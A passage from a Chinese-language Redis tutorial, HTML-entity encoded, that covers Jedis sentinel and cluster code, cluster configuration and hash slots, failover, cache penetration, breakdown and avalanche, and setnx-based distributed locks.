        jedisPoolConfig.setMinIdle(5); // &#x6700;&#x5C0F;&#x95F2;&#x7F6E;&#x8FDE;&#x63A5;&#x6570;
        jedisPoolConfig.setBlockWhenExhausted(true); // &#x8FDE;&#x63A5;&#x8017;&#x5C3D;&#x662F;&#x5426;&#x7B49;&#x5F85;
        jedisPoolConfig.setMaxWaitMillis(2000); // &#x7B49;&#x5F85;&#x65F6;&#x95F4;
        jedisPoolConfig.setTestOnBorrow(true); // &#x53D6;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x5019;&#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5; ping pong
        jedisSentinelPool=new JedisSentinelPool(&quot;mymaster&quot;,sentinelSet,jedisPoolConfig);
        return jedisSentinelPool.getResource();
        } else {
        return jedisSentinelPool.getResource();
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E9%9B%86%E7%BE%A4">&#x96C6;&#x7FA4;</h2>
<p>&#x96C6;&#x7FA4;&#x6A21;&#x5F0F;&#x5E38;&#x7528;&#x4E8E;&#x6269;&#x5BB9;&#x4EE5;&#x53CA;&#x4E3B;&#x673A;&#x5E76;&#x53D1;&#x5199;&#x64CD;&#x4F5C;&#x538B;&#x529B;&#x7684;&#x5206;&#x644A;&#x3002;&#x5F53;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#x548C;&#x85AA;&#x706B;&#x76F8;&#x4F20;&#x6A21;&#x5F0F;&#x4E2D;&#x7684;&#x4E3B;&#x673A;&#x5B95;&#x673A;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x65E0;&#x4E2D;&#x5FC3;&#x5316;&#x7684;&#x96C6;&#x7FA4;&#x914D;&#x7F6E;&#x89E3;&#x51B3;&#x5730;&#x5740;&#x53D8;&#x5316;&#x5BFC;&#x81F4;&#x7684;&#x914D;&#x7F6E;&#x4FEE;&#x6539;&#x95EE;&#x9898;&#x3002;&#x96C6;&#x7FA4;&#x5B9E;&#x73B0;&#x6C34;&#x5E73;&#x6269;&#x5BB9;&#xFF0C;&#x5373;&#x542F;&#x52A8;&#x591A;&#x4E2A;&#x670D;&#x52A1;&#x8282;&#x70B9;&#xFF0C;&#x5E76;&#x5C06;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5206;&#x5E03;&#x5B58;&#x50A8;&#x5728;&#x8FD9;&#x4E9B;&#x8282;&#x70B9;&#xFF0C;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x5B58;&#x50A8;&#x603B;&#x6570;&#x636E;&#x7684; 1/N&#x3002;</p>
<p>&#x5220;&#x9664;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E; =&gt; &#x5C06; rdb&#x3001;aof &#x6587;&#x4EF6;&#x90FD;&#x5220;&#x9664;&#x6389;&#x3002;</p>
<h3 id="%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE">&#x96C6;&#x7FA4;&#x914D;&#x7F6E;</h3>
<ul>
<li>&#x5355;&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;&#x516D;&#x9879;&#x670D;&#x52A1;&#x6A21;&#x62DF;&#x96C6;&#x7FA4;&#xFF0C;&#x64CD;&#x4F5C;&#x524D;&#x5E94;&#x5148;&#x5C06; dump.rdb &#x5220;&#x9664;&#x6392;&#x9664;&#x5E72;&#x6270;</li>
</ul>
<pre><code class="language-shell"># 9 &#x7ED3;&#x5C3E;&#x8868;&#x793A;&#x4E3B;&#x673A; 0 &#x7ED3;&#x5C3E;&#x8868;&#x793A;&#x4ECE;&#x673A;
rm -rf dump63*
</code></pre>
<ul>
<li>redis cluster &#x914D;&#x7F6E;&#x4FEE;&#x6539; =&gt; redis63xx.conf</li>
</ul>
<pre><code class="language-shell">include /home/bigdata/redis.conf
port 6379
pidfile &quot;/var/run/redis_6379.pid&quot;
dbfilename &quot;dump6379.rdb&quot;
dir &quot;/home/bigdata/redis_cluster&quot;
logfile &quot;/home/bigdata/redis_cluster/redis_err_6379.log&quot;
cluster-enabled yes # &#x6253;&#x5F00;&#x96C6;&#x7FA4;&#x6A21;&#x5F0F;
cluster-config-file nodes-6379.conf # &#x8BBE;&#x5B9A;&#x8282;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x540D;
cluster-node-timeout 15000 # &#x8BBE;&#x5B9A;&#x8282;&#x70B9;&#x5931;&#x8054;&#x65F6;&#x95F4; =&gt; &#x8D85;&#x8FC7;&#x8BE5;&#x65F6;&#x95F4;&#xFF08;&#x6BEB;&#x79D2;&#xFF09;&#x96C6;&#x7FA4;&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x4E3B;&#x4ECE;&#x5207;&#x6362;
</code></pre>
<ul>
<li>&#x590D;&#x5236;&#x591A;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5E76;&#x4FEE;&#x6539;</li>
</ul>
<pre><code class="language-shell"># &#x590D;&#x5236;&#x914D;&#x7F6E;&#x6587;&#x4EF6;
cp redis6379.conf redis63xx.conf
# &#x66FF;&#x6362;&#x5339;&#x914D;&#x5B57;&#x7B26;
:%s/6379/63xx
</code></pre>
<ul>
<li>&#x542F;&#x52A8;&#x670D;&#x52A1;|&#x5408;&#x6210;&#x96C6;&#x7FA4; =&gt; redis &#x5B9E;&#x4F8B;&#x542F;&#x52A8;&#x4E14; nodes-xxxx.conf &#x6587;&#x4EF6;&#x6B63;&#x5E38;&#x751F;&#x6210;</li>
</ul>
<pre><code class="language-shell">redis-server redis63xx.conf * 6
ps -ef | grep redis # &#x6B64;&#x65F6;&#x5E94;&#x8BE5;&#x6709; 6 &#x4E2A;&#x542F;&#x52A8;&#x7684; redis &#x9879;&#x76EE;
cd /opt/redis-7.0.2/src # &#x8FDB;&#x5165;&#x751F;&#x6210;&#x96C6;&#x7FA4;&#x7684;&#x73AF;&#x5883;
# &#x6B64;&#x5904;&#x4E0D;&#x8981;&#x7528; 127.0.0.1 &#x5E94;&#x7528;&#x771F;&#x5B9E; IP &#x5730;&#x5740;
# --replicas 1 =&gt; &#x7B80;&#x5355;&#x7684;&#x65B9;&#x5F0F;&#x914D;&#x7F6E;&#x96C6;&#x7FA4; -&gt; &#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x548C;&#x4E00;&#x53F0;&#x4ECE;&#x673A; -&gt; &#x6B63;&#x597D;&#x4E09;&#x7EC4;
redis-cli --cluster create --cluster-replicas 1 xxx.xx.xx.xxx:6379 xxx.xx.xx.xxx:6380 xxx.xx.xx.xxx:6381 xxx.xx.xx.xxx:6389 xxx.xx.xx.xxx:6390 xxx.xx.xx.xxx:6391
</code></pre>
<h3 id="%E9%9B%86%E7%BE%A4%E6%93%8D%E4%BD%9C%E4%B8%8E%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D">&#x96C6;&#x7FA4;&#x64CD;&#x4F5C;&#x4E0E;&#x6545;&#x969C;&#x6062;&#x590D;</h3>
<ul>
<li>&#x8282;&#x70B9;&#x5206;&#x914D;</li>
</ul>
<p>&#x4E00;&#x4E2A;&#x96C6;&#x7FA4;&#x81F3;&#x5C11;&#x8981;&#x6709;&#x4E09;&#x4E2A;&#x4E3B;&#x8282;&#x70B9;&#x3002;<code>--cluster-replicas 1</code> &#x8868;&#x793A;&#x5E0C;&#x671B;&#x4E3A;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x4E3B;&#x8282;&#x70B9;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x4ECE;&#x8282;&#x70B9;&#x3002;&#x5206;&#x914D;&#x539F;&#x5219;&#x5C3D;&#x91CF;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6BCF;&#x4E2A;&#x4ECE;&#x5E93;&#x548C;&#x4E3B;&#x5E93;&#x4E0D;&#x5728;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4E0A;&#x3002;</p>
<ul>
<li>slots &#x63D2;&#x69FD;</li>
</ul>
<p>redis &#x96C6;&#x7FA4;&#x5305;&#x542B; 16384 &#x4E2A;&#x63D2;&#x69FD;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x952E;&#x90FD;&#x5C5E;&#x4E8E;&#x8FD9;&#x4E9B;&#x63D2;&#x69FD;&#x4E2D;&#x7684;&#x5355;&#x5143;&#xFF0C;&#x516C;&#x5F0F; <code>CRC16(key) % 16384</code> &#x7528;&#x4E8E;&#x8BA1;&#x7B97;&#x952E; key &#x5C5E;&#x4E8E;&#x54EA;&#x4E2A;&#x63D2;&#x69FD;&#x3002;</p>
<p>redis &#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x90FD;&#x8D1F;&#x8D23;&#x5904;&#x7406;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x63D2;&#x69FD;&#x3002;&#x82E5;&#x96C6;&#x7FA4;&#x6709;&#x4E3B;&#x8282;&#x70B9; A&#x3001;B&#x3001;C&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5206;&#x914D; A &#x5904;&#x7406; 0 &#x81F3; 5460 &#x53F7;&#x63D2;&#x69FD;&#xFF1B;B &#x5904;&#x7406; 5461 &#x81F3; 10922 &#x53F7;&#x63D2;&#x69FD;&#xFF1B;C &#x5904;&#x7406;&#x4F59;&#x4E0B;&#x81F3; 16383 &#x53F7;&#x7684;&#x63D2;&#x69FD;&#x3002;</p>
<ul>
<li>&#x96C6;&#x7FA4;&#x4E2D;&#x5F55;&#x5165;&#x503C;</li>
</ul>
<pre><code class="language-shell"># &#x96C6;&#x7FA4;&#x65B9;&#x5F0F;&#x8FDE;&#x63A5;
[centos myredis]# redis-cli -c -p 6379
127.0.0.1:6379&gt; set k1 v1
-&gt; Redirected to slot [12706] located at xxx.xx.xx.xxx:6381
OK
xxx.xx.xx.xxx:6381&gt; set k2 v2
-&gt; Redirected to slot [449] located at xxx.xx.xx.xxx:6389
OK
# &#x6839;&#x636E;&#x7EC4;&#x540D;&#x8BA1;&#x7B97;&#x63D2;&#x69FD;&#x505A;&#x6DFB;&#x52A0; =&gt; &#x4F7F; key &#x4E2D; {} &#x5185;&#x76F8;&#x540C;&#x5185;&#x5BB9;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x653E;&#x5230;&#x4E00;&#x4E2A; slot
xxx.xx.xx.xxx:6389&gt; mset name zs age 22 address cs
(error) CROSSSLOT Keys in request don&apos;t hash to the same slot
xxx.xx.xx.xxx:6389&gt; mset name{user} zs age{user} 22 address{user} cs
OK
</code></pre>
<ul>
<li>&#x67E5;&#x8BE2;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x503C;</li>
</ul>
<pre><code class="language-shell"># &#x8BA1;&#x7B97;&#x67D0;&#x952E;&#x5728;&#x54EA;&#x4E2A;&#x63D2;&#x69FD;
xxx.xx.xx.xxx:6389&gt; cluster keyslot k1
(integer) 12706 # k1 &#x63D2;&#x69FD;&#x503C;
# &#x8BA1;&#x7B97;&#x63D2;&#x69FD;&#x503C;&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x952E;
xxx.xx.xx.xxx:6389&gt; cluster countkeysinslot 449
(integer) 1
# &#x8FD4;&#x56DE; count &#x4E2A; slot &#x69FD;&#x4E2D;&#x7684;&#x952E;
xxx.xx.xx.xxx:6389&gt; cluster getkeysinslot 5474 10
1) &quot;address{user}&quot;
2) &quot;age{user}&quot;
3) &quot;name{user}&quot;
</code></pre>
<ul>
<li>&#x6545;&#x969C;&#x6062;&#x590D;</li>
</ul>
<p>&#x4E3B;&#x8282;&#x70B9;&#x4E0B;&#x7EBF;&#x540E;&#xFF0C;&#x4ECE;&#x8282;&#x70B9;&#x4F1A;&#x81EA;&#x52A8;&#x5347;&#x4E3A;&#x4E3B;&#x8282;&#x70B9;&#x3002;&#x4E3B;&#x8282;&#x70B9;&#x4ECE;&#x5B95;&#x673A;&#x6062;&#x590D;&#x540E;&#x4F1A;&#x53D8;&#x4E3A;&#x4ECE;&#x8282;&#x70B9;&#x3002;&#x5F53;&#x67D0;&#x4E00;&#x6BB5;&#x63D2;&#x69FD;&#x7684;&#x4E3B;&#x4ECE;&#x8282;&#x70B9;&#x90FD;&#x5B95;&#x6389;&#xFF0C;&#x670D;&#x52A1;&#x4F1A;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x4EA7;&#x751F;&#x5168;&#x90E8;&#x5B95;&#x673A;&#x6216;&#x53EA;&#x6709;&#x8BE5;&#x63D2;&#x69FD;&#x6570;&#x636E;&#x7F62;&#x5DE5;&#x7684;&#x4E24;&#x79CD;&#x4E0D;&#x540C;&#x60C5;&#x51B5;&#x3002;</p>
<pre><code class="language-shell"># redis.conf
cluster-require-full-coverage yes|no
</code></pre>
<ul>
<li>&#x96C6;&#x7FA4;&#x7684; Jedis &#x5F00;&#x53D1;</li>
</ul>
<pre><code class="language-java">public class JedisClusterTest {
  public static void main(String[] args) {
     // &#x521B;&#x5EFA;&#x5BF9;&#x8C61; =&gt; &#x65E0;&#x4E2D;&#x5FC3;&#x5316; -&gt; &#x653E;&#x4E00;&#x4E2A; HostAndPort &#x5373;&#x53EF;
     HostAndPort hostAndPort = new HostAndPort(&quot;xxx.xx.xx.xx&quot;,6379);
     JedisCluster jedisCluster=new JedisCluster(hostAndPort);
     jedisCluster.set(&quot;k1&quot;, &quot;v1&quot;);
     System.out.println(jedisCluster.get(&quot;k1&quot;));
     jedisCluster.close();
  }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%BA%94%E7%94%A8%E9%97%AE%E9%A2%98">&#x5E94;&#x7528;&#x95EE;&#x9898;</h2>
<h3 id="%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F">&#x7F13;&#x5B58;&#x7A7F;&#x900F;</h3>
<p>&#x7F13;&#x5B58;&#x7A7F;&#x900F;&#x7684;&#x73B0;&#x8C61;&#x662F;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#x589E;&#x5927;&#xFF0C;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x867D;&#x5E73;&#x7A33;&#x8FD0;&#x884C;&#x4F46;&#x547D;&#x4E2D;&#x7387;&#x4E0B;&#x964D;&#xFF0C;&#x603B;&#x662F;&#x4F1A;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7531;&#x4E8E;&#x7F13;&#x5B58;&#x672C;&#x5C31;&#x67E5;&#x8BE2;&#x4E0D;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5185;&#x5BB9;&#x6216;&#x8005;&#x51FA;&#x73B0;&#x975E;&#x6B63;&#x5E38;&#x7684;&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x9020;&#x6210;&#x7684;&#x3002;&#x6BD4;&#x5982;&#x8FDE;&#x7EED;&#x8BBF;&#x95EE;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x767E;&#x5EA6;&#x6587;&#x5E93;&#x5730;&#x5740;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x8FDB;&#x884C;&#x7A7A;&#x503C;&#x7F13;&#x5B58;&#xFF0C;&#x5373;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x4ECD;&#x7136;&#x628A;&#x8FD9;&#x4E2A;&#x7A7A;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6700;&#x957F;&#x4E0D;&#x8D85;&#x8FC7;&#x4E94;&#x5206;&#x949F;&#x7684;&#x77ED;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x3002;&#x540C;&#x65F6;&#x5EFA;&#x8BAE;&#x8BBE;&#x7F6E;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x767D;&#x540D;&#x5355;&#xFF0C;&#x5373;&#x540D;&#x5355; Id &#x4F5C;&#x4E3A; bitmaps &#x7684;&#x504F;&#x79FB;&#x91CF;&#xFF0C;&#x6BCF;&#x6B21;&#x8BBF;&#x95EE;&#x90FD;&#x548C;&#x5176;&#x4E2D; Id &#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#xFF0C;&#x82E5;&#x4E0D;&#x5728;&#x5176;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8FDB;&#x884C;&#x62E6;&#x622A;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;&#x3002;&#x5176;&#x4ED6;&#x65B9;&#x6848;&#x662F;&#x91C7;&#x7528;&#x5E03;&#x9686;&#x8FC7;&#x6EE4;&#x5668; Bloom Filter&#xFF0C;&#x5176;&#x5E95;&#x5C42;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x5411;&#x91CF;&#x548C;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x968F;&#x673A;&#x6620;&#x5C04;&#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x8003;&#x8651;&#x5176;&#x547D;&#x4E2D;&#x7387;&#x7684;&#x95EE;&#x9898;&#x3002;&#x6700;&#x540E;&#x8FDB;&#x884C;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#xFF0C;&#x5F53;&#x53D1;&#x73B0;&#x7F13;&#x5B58;&#x7684;&#x547D;&#x4E2D;&#x7387;&#x6025;&#x5267;&#x964D;&#x4F4E;&#xFF0C;&#x9700;&#x6392;&#x67E5;&#x8BBF;&#x95EE;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x636E;&#xFF0C;&#x548C;&#x8FD0;&#x7EF4;&#x8BBE;&#x7F6E;&#x9ED1;&#x540D;&#x5355;&#x9650;&#x5236;&#x670D;&#x52A1;&#xFF08;&#x6447;&#x4EBA;&#x5E2E;&#x5FD9;&#xFF09;&#x3002;</p>
<h3 id="%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF">&#x7F13;&#x5B58;&#x51FB;&#x7A7F;</h3>
<p>&#x7F13;&#x5B58;&#x51FB;&#x7A7F;&#x7684;&#x73B0;&#x8C61;&#x662F;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#x77AC;&#x65F6;&#x589E;&#x5927;&#xFF0C;&#x7F13;&#x5B58;&#x91CC;&#x4E5F;&#x6CA1;&#x6709;&#x51FA;&#x73B0;&#x5927;&#x91CF;&#x7684;&#x952E;&#x8FC7;&#x671F;&#xFF0C;&#x4E14;&#x4F9D;&#x65E7;&#x5904;&#x4E8E;&#x6B63;&#x5E38;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7531;&#x4E8E;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x952E;&#x8FC7;&#x671F;&#xFF0C;&#x540C;&#x65F6;&#x6709;&#x5927;&#x91CF;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x8FC7;&#x6765;&#xFF0C;&#x5728;&#x8FD9;&#x4E9B;&#x8BF7;&#x6C42;&#x53D1;&#x73B0;&#x7F13;&#x5B58;&#x8FC7;&#x671F;&#x65F6;&#x4F1A;&#x5411;&#x540E;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x53D1;&#x9001;&#x6D77;&#x91CF;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x9020;&#x6210;&#x7684;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x8FDB;&#x884C;&#x9884;&#x5148;&#x8BBE;&#x7F6E;&#x70ED;&#x95E8;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x5728;&#x9AD8;&#x5CF0;&#x8BBF;&#x95EE;&#x524D;&#xFF0C;&#x5C06;&#x70ED;&#x95E8;&#x6570;&#x636E;&#x63D0;&#x524D;&#x5B58;&#x5165;&#x5230;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x589E;&#x52A0;&#x70ED;&#x95E8;&#x6570;&#x636E;&#x952E;&#x7684;&#x5931;&#x6548;&#x65F6;&#x957F;&#x3002;&#x5176;&#x6B21;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x9501;&#xFF0C;&#x5728;&#x7F13;&#x5B58;&#x5931;&#x6548;&#x65F6;&#x5148;&#x5224;&#x65AD;&#x62FF;&#x51FA;&#x6765;&#x7684;&#x503C;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x7A7A;&#x503C;&#x5C31;&#x5E94;&#x8BE5;&#x7ACB;&#x523B;&#x8BBE;&#x7F6E;&#x6392;&#x4ED6;&#x9501;&#xFF0C;&#x5728;&#x6210;&#x529F;&#x8BBE;&#x7F6E;&#x6392;&#x4ED6;&#x9501;&#x540E;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x540C;&#x6B65;&#x7F13;&#x5B58;&#xFF0C;&#x6700;&#x540E;&#x5220;&#x9664;&#x6392;&#x4ED6;&#x9501;&#x3002;&#x4F46;&#x662F;&#x7528;&#x5230;&#x9501;&#xFF0C;&#x90A3;&#x4E48;&#x5FC5;&#x5B9A;&#x6548;&#x7387;&#x964D;&#x4F4E;&#x3002;</p>
<h3 id="%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9">&#x7F13;&#x5B58;&#x96EA;&#x5D29;</h3>
<p>&#x7F13;&#x5B58;&#x96EA;&#x5D29;&#x7684;&#x73B0;&#x8C61;&#x662F;&#x6570;&#x636E;&#x5E93;&#x538B;&#x529B;&#x589E;&#x5927;&#x4EE5;&#x81F3;&#x670D;&#x52A1;&#x5668;&#x5D29;&#x6E83;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7531;&#x4E8E;&#x5728;&#x77ED;&#x6682;&#x65F6;&#x95F4;&#x5185;&#x6709;&#x5927;&#x91CF;&#x952E;&#x7684;&#x96C6;&#x4E2D;&#x8FC7;&#x671F;&#x7684;&#x60C5;&#x51B5;&#x9020;&#x6210;&#x7684;&#x3002;</p>
<p>&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x6784;&#x5EFA;&#x591A;&#x7EA7;&#x7F13;&#x5B58;&#x7684;&#x67B6;&#x6784;&#xFF0C;nginx &#x7F13;&#x5B58;&#x3001;redis &#x7F13;&#x5B58;&#x642D;&#x914D;&#x5176;&#x4ED6;&#x7F13;&#x5B58;&#xFF08;ehcache &#x7B49;&#xFF09;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x9501;&#x6216;&#x961F;&#x5217;&#x6765;&#x4FDD;&#x8BC1;&#x4E0D;&#x4F1A;&#x6709;&#x5927;&#x91CF;&#x7EBF;&#x7A0B;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x540C;&#x65F6;&#x8BFB;&#x5199;&#xFF0C;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x5931;&#x6548;&#x65F6;&#x5927;&#x91CF;&#x7684;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x843D;&#x5230;&#x5E95;&#x5C42;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x4E0A;&#xFF0C;&#x4F46;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5E76;&#x4E0D;&#x9002;&#x7528;&#x9AD8;&#x5E76;&#x53D1;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x5176;&#x6B21;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x6807;&#x5FD7;&#x66F4;&#x65B0;&#x7F13;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x952E;&#x8FC7;&#x671F;&#xFF0C;&#x90A3;&#x4E48;&#x89E6;&#x53D1;&#x901A;&#x77E5;&#x53E6;&#x5916;&#x7684;&#x7EBF;&#x7A0B;&#x5728;&#x540E;&#x53F0;&#x53BB;&#x66F4;&#x65B0;&#x5B9E;&#x9645;&#x952E;&#x7684;&#x7F13;&#x5B58;&#x3002;&#x6700;&#x4F73;&#x505A;&#x6CD5;&#x662F;&#x5C06;&#x7F13;&#x5B58;&#x5931;&#x6548;&#x65F6;&#x95F4;&#x5206;&#x6563;&#xFF0C;&#x5728;&#x539F;&#x6709;&#x7684;&#x5931;&#x6548;&#x65F6;&#x95F4;&#x57FA;&#x7840;&#x4E0A;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x503C;&#xFF0C;&#x8FD9;&#x6837;&#x6BCF;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x7684;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;&#x91CD;&#x590D;&#x7387;&#x5C31;&#x4F1A;&#x964D;&#x4F4E;&#x3002;</p>
<p>&#x7F13;&#x5B58;&#x96EA;&#x5D29;&#x4E0E;&#x7F13;&#x5B58;&#x51FB;&#x7A7F;&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x524D;&#x8005;&#x662F;&#x9488;&#x5BF9;&#x5F88;&#x591A;&#x952E;&#x7684;&#x7F13;&#x5B58;&#x96C6;&#x4F53;&#x5931;&#x6548;&#xFF0C;&#x540E;&#x8005;&#x5219;&#x662F;&#x67D0;&#x4E00;&#x4E2A;&#x952E;&#x7A81;&#x7136;&#x88AB;&#x6D77;&#x91CF;&#x8BF7;&#x6C42;&#x3002;</p>
<h3 id="%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81">&#x5206;&#x5E03;&#x5F0F;&#x9501;</h3>
<p>&#x5355;&#x673A;&#x90E8;&#x7F72;&#x7684;&#x7CFB;&#x7EDF;&#x88AB;&#x6F14;&#x5316;&#x6210;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x67B6;&#x6784;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x4E0E;&#x591A;&#x8FDB;&#x7A0B;&#x5206;&#x5E03;&#x5728;&#x4E0D;&#x540C;&#x673A;&#x5668;&#xFF0C;&#x539F;&#x5355;&#x673A;&#x90E8;&#x7F72;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x5E76;&#x53D1;&#x63A7;&#x5236;&#x9501;&#x7B56;&#x7565;&#x5931;&#x6548;&#xFF0C;&#x5355;&#x7EAF;&#x7684; Java API &#x5E76;&#x4E0D;&#x80FD;&#x63D0;&#x4F9B;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x7684;&#x80FD;&#x529B;&#x3002;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x8FDB;&#x884C;&#x8DE8; JVM &#x7684;&#x4E92;&#x65A5;&#x673A;&#x5236;&#x63A7;&#x5236;&#x5171;&#x4EAB;&#x8D44;&#x6E90;&#x7684;&#x8BBF;&#x95EE;&#x3002;</p>
<p>&#x6570;&#x636E;&#x5E93;&#x3001;redis &#x548C; Zookeeper &#x90FD;&#x80FD;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x3002;&#x53EF;&#x9760;&#x6027; zookeeper &#x6700;&#x9AD8;&#xFF0C;&#x6027;&#x80FD;&#x4E0A; redis &#x6700;&#x4F73;&#x3002;</p>
<pre><code class="language-shell"># &#x8BBE;&#x7F6E;&#x9501; =&gt; setnx
xxx.xx.xx.xxx:6389&gt; setnx users 10
-&gt; Redirected to slot [14124] located at xxx.xx.xx.xxx:6381
(integer) 1
xxx.xx.xx.xxx:6381&gt; setnx users 11
(integer) 0
# &#x91CA;&#x653E;&#x9501; =&gt; setnx
xxx.xx.xx.xxx:6381&gt; del users
(integer) 1
# &#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x9501;
xxx.xx.xx.xxx:6381&gt; setnx users 10
(integer) 1
xxx.xx.xx.xxx:6381&gt; expire users 10
(integer) 1
xxx.xx.xx.xxx:6381&gt; ttl users
(integer) 5
# &#x4E0A;&#x9501;&#x65F6;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4; =&gt; &#x907F;&#x514D;&#x4E0A;&#x9501;&#x540E;&#x5F02;&#x5E38;&#x65E0;&#x6CD5;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;
xxx.xx.xx.xxx:6381&gt; set users nx ex 10
OK
</code></pre>
<ul>
<li>UUID &#x9632;&#x8BEF;&#x5220;&#x4EE5;&#x53CA;&#x5220;&#x9664;&#x539F;&#x5B50;&#x6027;&#x6574;&#x5408;</li>
</ul>
